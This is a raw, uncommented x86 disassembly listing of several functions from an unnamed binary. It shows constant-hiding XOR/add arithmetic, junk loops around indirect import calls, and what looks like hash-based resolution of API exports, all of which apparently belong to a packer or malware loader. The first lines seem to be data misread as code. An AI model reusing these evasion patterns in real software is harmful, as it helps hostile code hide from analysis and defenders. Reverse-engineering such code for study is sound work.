  41adc7:	imul   edi,DWORD PTR [ecx],0x55
  41adca:	adc    al,0x70
  41adcc:	int3   
  41adcd:	sub    al,0x48
  41adcf:	sbb    edx,DWORD PTR [eax+0x6a1faca9]
  41add5:	loope  0x41ada8
  41add7:	push   ebx
  41add8:	in     al,0x10
  41adda:	in     al,0xa8
  41addc:	or     DWORD PTR [edx+0x7f],eax
  41addf:	jnp    0x41ae2a
  41ade1:	cwde   
  41ade2:	shr    DWORD PTR [edi+0x2610cf2e],cl
  41ade8:	cmp    al,0x2b
  41adea:	mov    esp,0xf8458960
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c56
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ad6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cde
  41afcc:	mov    ecx,DWORD PTR ds:0x421a4e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x423892
  41b017:	push   0x423812
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c56
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237ed
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423804
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c76
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bcc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423962
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d66,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ab1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
